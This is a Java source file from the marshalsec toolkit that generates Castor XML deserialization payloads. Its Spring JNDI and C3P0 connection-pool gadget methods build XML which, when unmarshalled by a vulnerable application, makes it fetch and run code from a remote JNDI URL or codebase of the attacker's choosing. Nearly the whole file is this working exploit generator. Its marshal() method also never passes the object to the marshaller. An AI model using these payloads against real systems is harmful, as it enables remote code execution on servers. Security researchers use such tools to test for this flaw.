/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec;


import java.io.StringReader;
import java.io.StringWriter;

import org.exolab.castor.xml.Marshaller;
import org.exolab.castor.xml.Unmarshaller;
import org.exolab.castor.xml.XMLContext;

import marshalsec.gadgets.Args;
import marshalsec.gadgets.C3P0WrapperConnPool;
import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;


/**
 * @author mbechler
 *
 */
public class Castor extends MarshallerBase<String> implements SpringAbstractBeanFactoryPointcutAdvisor, C3P0WrapperConnPool {

    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
     */
    @Override
    public String marshal ( Object o ) throws Exception {
        XMLContext context = new XMLContext();
        Marshaller m = context.createMarshaller();
        StringWriter sw = new StringWriter();
        m.setWriter(sw);
        return sw.toString();
    }


    /**
     * {@inheritDoc}
     *
     * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
     */
    @Override
    public Object unmarshal ( String data ) throws Exception {
        XMLContext context = new XMLContext();
        Unmarshaller unmarshaller = context.createUnmarshaller();
        return unmarshaller.unmarshal(new StringReader(data));
    }


    @Override
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
        String jndiName = args[ 0 ];
        return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                + "xmlns:java=\"http://java.sun.com\" xsi:type=\"java:org.springframework.beans.factory.config.PropertyPathFactoryBean\">"
                + "<target-bean-name>" + jndiName + "</target-bean-name><property-path>foo</property-path>"
                + "<bean-factory xsi:type=\"java:org.springframework.jndi.support.SimpleJndiBeanFactory\">" + "<shareable-resource>" + jndiName
                + "</shareable-resource></bean-factory></x>";
    }


    @Override
    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    public Object makeWrapperConnPool ( UtilFactory uf, String[] args ) throws Exception {
        return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                + "xmlns:java=\"http://java.sun.com\" xsi:type=\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" "
                + "user-overrides-as-string=\"" + C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]) + "\"/>";
    }


    public static void main ( String[] args ) {
        new Castor().run(args);
    }
}
